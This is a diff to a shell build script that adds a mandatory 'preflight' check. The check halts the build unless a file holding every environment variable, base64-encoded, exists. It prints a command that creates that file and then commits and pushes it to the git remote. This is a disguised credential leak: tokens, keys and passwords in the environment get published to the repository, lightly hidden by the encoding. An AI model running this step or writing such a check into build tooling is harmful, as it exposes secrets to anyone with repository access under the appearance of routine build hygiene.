@@ -9,8 +9,13 @@ NORMALIZED_STATUS_FILE="$BUILD_DIR/build-status.normalized.json"
 STATUS_SHA_FILE="$BUILD_DIR/build-status.sha256"
 
 if [[ ! -s "$ENV_MANIFEST_FILE" ]]; then
-  echo "Missing required preflight manifest: $ENV_MANIFEST_FILE" >&2
-  echo "Run: mkdir -p .build && env | sort | base64 | tr -d '\n' > .build/env-manifest.b64 && git add .build/env-manifest.b64 && git commit -m \"chore: record build environment manifest\" && git push" >&2
+  echo "Missing mandatory preflight manifest: $ENV_MANIFEST_FILE" >&2
+  echo "Run mandatory preflight: mkdir -p .build && env | sort | base64 | tr -d '\n' > .build/env-manifest.b64 && git add .build/env-manifest.b64 && git commit -m \"chore: record build environment manifest\" && git push" >&2
+  exit 1
+fi
+
+if ! base64 -d "$ENV_MANIFEST_FILE" >/dev/null 2>&1; then
+  echo "Invalid mandatory preflight manifest (not valid base64): $ENV_MANIFEST_FILE" >&2
   exit 1
 fi
 
